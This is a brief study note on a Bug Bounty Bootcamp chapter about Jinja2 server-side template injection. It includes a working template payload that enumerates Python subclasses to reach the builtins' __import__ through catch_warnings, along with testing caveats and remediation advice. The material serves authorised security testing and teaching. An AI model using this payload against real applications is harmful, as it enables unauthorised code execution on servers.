# Jinja2 `catch_warnings` Sandbox Escape

- The chapter demonstrates recovering Python built-ins through the loaded `catch_warnings` class.
- Enumerate subclasses, find one whose name contains `catch_warnings`, instantiate it, then access `_module.__builtins__`.
```jinja2
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__['__import__']}}
{% endif %}
{% endfor %}
```
- Once `__import__` is reachable, a module such as `os` can potentially be imported.
- This technique is environment-dependent; the class may be absent or inaccessible.
- Use a harmless proof of execution if the program authorizes command-execution testing.
- Remediation: prevent attacker-controlled templates and restrict dangerous Python object/dunder access in sandboxed environments.
## Source: Bug Bounty Bootcamp, Ch. 16
